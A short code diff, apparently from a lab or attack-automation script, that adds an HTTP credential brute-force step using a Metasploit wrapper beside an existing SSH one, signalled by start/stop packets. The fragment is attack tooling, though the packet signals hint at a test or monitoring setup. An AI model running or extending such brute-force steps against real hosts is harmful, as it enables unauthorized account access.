@@ -33,4 +33,8 @@ for connected_ip in connected_ips:
     metasploit.brute_force_login(connected_ip[0], 'ssh')
     send_packet("ssh_wordlist", connected_ip[0], "stop", connected_ip[1])
 
+    send_packet("http_wordlist", connected_ip[0], "start", connected_ip[1])
+    metasploit.brute_force_login(connected_ip[0], 'http')
+    send_packet("http_wordlist", connected_ip[0], "stop", connected_ip[1])
+
 
